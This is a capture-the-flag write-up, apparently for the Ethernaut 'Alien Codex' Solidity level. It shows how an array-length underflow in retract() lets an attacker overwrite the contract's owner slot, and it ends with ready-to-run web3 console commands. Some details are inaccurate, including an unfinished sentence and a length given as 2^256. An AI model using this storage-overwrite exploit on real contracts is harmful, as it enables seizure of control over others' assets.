# Alien Codex

The goal of this level is to claim ownership over the contract `AlienCodex`. The contract does not contain an `owner` variable as it comes from the inherited `Ownable` contract. The owner is defined at slot 0 of `Ownable` in `Ownable.sol`. Another important thing to note is that the compiler version is set to `^0.5.0`, which does not contain checked arithmetic by default. This means that the `retract()` function, which decrements the `codex` bytes32 array's length. We can abuse this to take over the complete contract storage slot.

First, we must call the `makeContact()` function in order to set `contact` to `true`, which allows us to pass the `contacted()` modifier. Then we call the `retract()` function. This decrements the `codex.length` by 1, which is an issue since the default value of the `bytes32` array is 0. This therefore underflows changing the `codex.length` to 2^256, or the total storage capacity of the contract. Now, we can access any variable stored within this contract. We can then call the `revise()` function at slot 0 of the array and update the value of `_owner` with our own address.

Luckily, this can all be done within the console:

First we calculate the slot location of the owner: `slotLoc = web3.utils.keccak256(web3.eth.abi.encodeParameters(["uint256"], [1]));`. Then to calculate the index,we suptract the location from 2^256, our new array length due to our `retract()` call. To convert our address to `bytes32` we can append our address to 24 repeating zeros: `addr = "0x" + "0".repeat(24) + player.slice(2);` 

To claim ownership over the contract simply pass in the index and our address to a `revise()` function call. In our console, we write the following:
```
await contract.makeContact();
await contract.retract();

// Determining the slot location
slotLoc = web3.utils.keccak256(web3.eth.abi.encodeParameters(["uint256"], [1]));

index = BigInt(2 ** 256) - BigInt(slotLoc);

addr = "0x" + "0".repeat(24) + player.slice(2);
contract.revise(index, addr);

// Verify we are the new owner
await contract.owner() == player;
```
